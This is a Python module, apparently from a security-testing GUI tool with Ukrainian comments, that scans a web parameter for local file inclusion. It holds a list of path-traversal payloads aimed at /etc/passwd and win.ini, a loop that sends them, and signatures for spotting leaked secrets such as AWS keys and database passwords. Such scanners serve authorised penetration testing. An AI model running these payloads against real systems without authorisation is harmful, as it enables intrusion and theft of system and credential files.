# xss_security_gui/lfi_tester.py

import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List, Dict, Any, Optional

from xss_security_gui.settings import settings


DEFAULT_LFI_PAYLOADS: List[str] = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "..\\..\\windows\\win.ini",
    "/etc/passwd",
    "..%252f..%252fetc%252fpasswd",
]


# ---------------------------------------------------------
# Build URL even if parameter is missing
# ---------------------------------------------------------
def build_lfi_url(base_url: str, param: str, payload: str) -> str:
    """
    Формує URL з підстановкою payload.
    Якщо параметра немає — додаємо його автоматично.
    """
    parsed = urlparse(base_url)
    query = parse_qs(parsed.query, keep_blank_values=True)

    # Якщо параметра немає — додаємо
    if param not in query:
        query[param] = ["test"]

    # Підміняємо payload
    query[param] = [payload]

    new_query = urlencode(query, doseq=True)

    return urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))


# ---------------------------------------------------------
# Suspicious content detector
# ---------------------------------------------------------
def is_suspicious_content(text: str) -> bool:
    text = text.lower()

    signatures = getattr(settings, "LFI_SIGNATURES", None) or [
        "root:x",          # /etc/passwd
        "[extensions]",    # win.ini
        "[fonts]",
        "[drivers]",
        "app_key=",
        "db_password",
        "aws_secret_access_key",
        "smtp_pass",
        "smtp_user",
    ]

    return any(sig in text for sig in signatures)


# ---------------------------------------------------------
# MAIN LFI TESTER (БОЙОВИЙ)
# ---------------------------------------------------------
def test_lfi_payloads(
    base_url: str,
    param: str = "file",
    payloads: Optional[List[str]] = None,
    delay: Optional[float] = None,
    timeout: Optional[int] = None
) -> List[Dict[str, Any]]:

    if not base_url or not param:
        raise ValueError("URL і параметр повинні бути вказані")

    payloads = (
        payloads
        or getattr(settings, "LFI_PAYLOADS", None)
        or DEFAULT_LFI_PAYLOADS
    )

    delay = delay if delay is not None else getattr(settings, "LFI_DELAY", 0.5)
    timeout = timeout if timeout is not None else getattr(settings, "REQUEST_TIMEOUT", 10)

    results: List[Dict[str, Any]] = []

    for payload in payloads:
        full_url = build_lfi_url(base_url, param, payload)

        try:
            resp = requests.get(full_url, timeout=timeout)
            content = resp.text

            suspicious = is_suspicious_content(content)

            results.append({
                "url": full_url,
                "payload": payload,
                "status": resp.status_code,
                "length": len(content),
                "suspicious": suspicious,
                "body_snippet": content[:2000],   # ВАЖЛИВО: передаємо контент
            })

        except Exception as e:
            results.append({
                "url": full_url,
                "payload": payload,
                "status": "ERR",
                "length": 0,
                "suspicious": False,
                "error": str(e),
                "body_snippet": "",
            })

        time.sleep(delay)

    return results


# ---------------------------------------------------------
# Standalone test
# ---------------------------------------------------------
if __name__ == "__main__":
    base = "https://test.ru/view.php"
    test_results = test_lfi_payloads(base, param="file")

    for res in test_results:
        mark = "✅" if res["suspicious"] else "⚠️"
        print(f"{mark} {res['url']} | status={res['status']} | len={res['length']}")
        if "error" in res:
            print(f"   ❌ Error: {res['error']}")
